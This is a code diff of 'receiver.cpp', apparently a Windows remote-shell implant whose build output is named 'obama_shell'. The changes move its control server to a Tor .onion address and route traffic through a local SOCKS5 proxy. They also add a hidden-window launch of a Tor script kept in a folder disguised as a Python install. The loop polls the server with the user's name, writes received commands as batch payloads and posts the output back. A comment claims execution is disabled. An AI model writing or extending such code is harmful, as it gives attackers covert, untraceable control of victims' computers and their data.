@@ -1,10 +1,10 @@
 // receiver.cpp — C++ port of receiver.bat (debugging version)
 // Networking wired (WinHTTP). Payload execution remains DISABLED by design.
-// Build: g++ -std=c++17 -O2 receiver.cpp -o receiver.exe -lshlwapi -lwinhttp
+// Build (x64 developer cmd): cl /EHsc /O2 /MT obama_shell.cpp /I C:\vcpkg\installed\x64-windows-static\include C:\vcpkg\installed\x64-windows-static\lib\libcurl.lib C:\vcpkg\installed\x64-windows-static\lib\libssl.lib C:\vcpkg\installed\x64-windows-static\lib\libcrypto.lib C:\vcpkg\installed\x64-windows-static\lib\zlib.lib Shlwapi.lib Iphlpapi.lib Secur32.lib ws2_32.lib winmm.lib bcrypt.lib crypt32.lib advapi32.lib user32.lib
 
 #include <windows.h>
 #include <shlwapi.h>
-#include <winhttp.h>
+#include <curl/curl.h>
 #include <io.h>
 #include <fcntl.h>
 #include <cstdio>
@@ -19,7 +19,7 @@
 
 #pragma comment(lib, "Winhttp.lib")
 
-static std::string URL       = "http://raupe.ddns.net/cdr"; // set "URL=http://raupe.ddns.net/cdr"
+static std::string URL       = "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/cdr";
 static std::string USER;                                    // set "USER=%USERNAME%"
 static int         POLL_DELAY = 5;                          // set "POLL_DELAY=5"
 
@@ -29,6 +29,61 @@ static std::string RESP;
 static std::string PAYLOAD;
 static std::string OUTFILE;
 static std::string SEND_RESULT;
+
+
+bool start_tor_proxy_hidden()
+{
+    // Expand the environment variable
+    const char* tmpl = "%LOCALAPPDATA%\\python-v.3.11.0\\lib\\tor\\Start-Tor-Proxy.cmd";
+    // First call to get required buffer size
+    DWORD needed = ExpandEnvironmentStringsA(tmpl, nullptr, 0);
+    if (needed == 0) {
+        return false;
+    }
+
+    std::vector<char> expanded(needed);
+    if (ExpandEnvironmentStringsA(tmpl, expanded.data(), needed) == 0) {
+        return false;
+    }
+
+    std::string scriptPath = expanded.data();
+
+    // Build the full command line for cmd.exe: /C "C:\path\Start-Tor-Proxy.cmd"
+    std::string cmdLine = std::string("/C \"") + scriptPath + "\"";
+
+    STARTUPINFOA si{};
+    PROCESS_INFORMATION pi{};
+    si.cb = sizeof(si);
+
+    // IMPORTANT: CreateProcess modifies the command-line buffer, so use a mutable buffer.
+    std::vector<char> cmdMutable(cmdLine.begin(), cmdLine.end());
+    cmdMutable.push_back('\0');
+
+    BOOL ok = CreateProcessA(
+        "C:\\Windows\\System32\\cmd.exe", // application name (can be nullptr)
+        cmdMutable.data(),                // mutable command line
+        nullptr, nullptr,                 // process/thread attrs
+        FALSE,                            // inherit handles
+        CREATE_NO_WINDOW,                 // create flags - hidden window
+        nullptr,                          // environment
+        nullptr,                          // working directory (nullptr = current)
+        &si, &pi);
+
+    if (!ok) {
+        return false;
+    }
+
+    // Wait for process startup (you can use an appropriate timeout)
+    DWORD wait = WaitForSingleObject(pi.hProcess, 15000); // 15s timeout
+    if (wait == WAIT_TIMEOUT) {
+        // Process still running — you may choose to continue or terminate
+    }
+
+    // Always close handles when you're done with them
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    return true;
+}
 
 // -------------------------
 // Helpers
@@ -117,151 +172,43 @@ static void replace_backslash_n_in_file(const std::string& path)
     write_text(path, out);
 }
 
-// -------------------------
-// Minimal URL parser for WinHTTP
-// -------------------------
-struct ParsedUrl {
-    bool   secure = false;
-    std::wstring host;
-    INTERNET_PORT port = 0;
-    std::wstring path; // includes leading '/'
-};
-
-static std::wstring to_wide(const std::string& s) {
-    if (s.empty()) return L"";
-    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
-    std::wstring w; w.resize(n);
-    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
-    return w;
+static size_t write_cb(char* ptr, size_t size, size_t nmemb, void* userdata) {
+    std::string* out = static_cast<std::string*>(userdata);
+    out->append(ptr, size * nmemb);
+    return size * nmemb;
 }
 
-static bool parse_url(const std::string& url, ParsedUrl& out)
+bool http_post(const std::string& url,
+                   const std::string& body,
+                   std::string& response,
+                   std::string& err)
 {
-    size_t scheme_pos = url.find("://");
-    if (scheme_pos == std::string::npos) return false;
-    std::string scheme = url.substr(0, scheme_pos);
-    out.secure = (_stricmp(scheme.c_str(), "https") == 0);
+    CURL* curl = curl_easy_init();
+    if (!curl) { err = "curl_easy_init failed"; return false; }
 
-    size_t host_start = scheme_pos + 3;
-    size_t path_start = url.find('/', host_start);
-    std::string hostport = (path_start == std::string::npos)
-                                ? url.substr(host_start)
-                                : url.substr(host_start, path_start - host_start);
-    std::string path = (path_start == std::string::npos)
-                                ? "/"
-                                : url.substr(path_start);
+    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)body.size());
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, "libcurl-example/1.0");
 
-    std::string host = hostport;
-    INTERNET_PORT port = out.secure ? 443 : 80;
+    // Route through Tor’s SOCKS5 listener and resolve hostnames remotely
+    curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:9050");
+    curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
 
-    // ipv6 [::1]:port not handled; fine for typical hostnames
-    size_t colon = hostport.rfind(':');
-    if (colon != std::string::npos && colon > 0 && hostport.find(']') == std::string::npos) {
-        host = hostport.substr(0, colon);
-        std::string pstr = hostport.substr(colon + 1);
-        unsigned long p = std::strtoul(pstr.c_str(), nullptr, 10);
-        if (p > 0 && p <= 65535) port = (INTERNET_PORT)p;
-    }
+    // reasonable timeouts
+    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT_MS, 10000L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS,        15000L);
 
-    out.host = to_wide(host);
-    out.port = port;
-    out.path = to_wide(path);
-    return !out.host.empty() && !out.path.empty();
-}
-
-// -------------------------
-// WinHTTP POST helper
-// -------------------------
-static bool http_post(const std::string& url, const std::string& body,
-                      std::string& out, DWORD timeout_ms, std::string* err_msg = nullptr)
-{
-    ParsedUrl pu;
-    if (!parse_url(url, pu)) {
-        if (err_msg) *err_msg = "Invalid URL";
+    CURLcode res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        err = curl_easy_strerror(res);
+        curl_easy_cleanup(curl);
         return false;
     }
 
-    HINTERNET hSession = WinHttpOpen(L"receiver/1.0",
-                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                                     WINHTTP_NO_PROXY_NAME,
-                                     WINHTTP_NO_PROXY_BYPASS, 0);
-    if (!hSession) { if (err_msg) *err_msg = "WinHttpOpen failed"; return false; }
-
-    WinHttpSetTimeouts(hSession, timeout_ms, timeout_ms, timeout_ms, timeout_ms);
-
-    HINTERNET hConnect = WinHttpConnect(hSession, pu.host.c_str(), pu.port, 0);
-    if (!hConnect) {
-        if (err_msg) *err_msg = "WinHttpConnect failed";
-        WinHttpCloseHandle(hSession);
-        return false;
-    }
-
-    DWORD flags = pu.secure ? WINHTTP_FLAG_SECURE : 0;
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", pu.path.c_str(),
-                                            nullptr, WINHTTP_NO_REFERER,
-                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
-    if (!hRequest) {
-        if (err_msg) *err_msg = "WinHttpOpenRequest failed";
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return false;
-    }
-
-    static const wchar_t* kHdr = L"Content-Type: text/plain; charset=utf-8\r\n";
-    BOOL b = WinHttpSendRequest(hRequest,
-                                kHdr, (DWORD)wcslen(kHdr),
-                                (LPVOID)body.data(), (DWORD)body.size(),
-                                (DWORD)body.size(), 0);
-    if (!b) {
-        if (err_msg) *err_msg = "WinHttpSendRequest failed";
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return false;
-    }
-
-    if (!WinHttpReceiveResponse(hRequest, nullptr)) {
-        if (err_msg) *err_msg = "WinHttpReceiveResponse failed";
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return false;
-    }
-
-    // Check HTTP status
-    DWORD status = 0, slen = sizeof(status);
-    if (!WinHttpQueryHeaders(hRequest,
-                             WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
-                             WINHTTP_HEADER_NAME_BY_INDEX, &status, &slen, WINHTTP_NO_HEADER_INDEX)) {
-        if (err_msg) *err_msg = "WinHttpQueryHeaders failed";
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return false;
-    }
-    if (status != 200) {
-        if (err_msg) *err_msg = "HTTP status " + std::to_string(status);
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return false;
-    }
-
-    // Read body
-    out.clear();
-    for (;;) {
-        DWORD avail = 0;
-        if (!WinHttpQueryDataAvailable(hRequest, &avail)) break;
-        if (avail == 0) break;
-        std::string buf; buf.resize(avail);
-        DWORD read = 0;
-        if (!WinHttpReadData(hRequest, &buf[0], avail, &read) || read == 0) break;
-        out.append(buf.data(), read);
-    }
-
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    curl_easy_cleanup(curl);
     return true;
 }
 
@@ -270,6 +217,7 @@ static bool http_post(const std::string& url, const std::string& body,
 // -------------------------
 int main()
 {
+    start_tor_proxy_hidden();
     // Resolve %USERNAME%
     if (const char* u = std::getenv("USERNAME")) USER = u; else USER.clear();
 
@@ -321,7 +269,7 @@ int main()
         {
             std::string body = USER + " ### GET";
             std::string response, err;
-            bool ok = http_post(URL, body, response, /*timeout_ms*/10000, &err);
+            bool ok = http_post(URL, body, response, err);
             if (!ok) {
                 log_line("[WARN] HTTP request failed: " + err);
                 // parity with batch: write error text (or empty) into RESP so it is logged
@@ -404,6 +352,7 @@ int main()
                     wrote = write_text(PAYLOAD, "@echo off\r\ncd");
                 } else {
                     wrote = write_text(PAYLOAD, "@echo off\r\necho __NO_PAYLOAD__");
+                    std::printf("[!] No valid Payload received: %s\n", text.c_str());
                 }
             } catch (...) {
                 wrote = write_text(PAYLOAD, "@echo off\r\necho __ERROR_PARSING_RESPONSE__");
@@ -548,8 +497,8 @@ int main()
             if (out.empty()) out = "__NO_OUTPUT__";
             std::string body = USER + " ### " + std::string("output ### ") + out;
 
-            std::string resp, err;
-            bool ok = http_post(URL, body, resp, /*timeout_ms*/15000, &err);
+            std::string response, err;
+            bool ok = http_post(URL, body, response, err);
             if (ok) {
                 write_text(SEND_RESULT, "OK");
                 log_line(std::string("[INFO] Results send back: OK"));
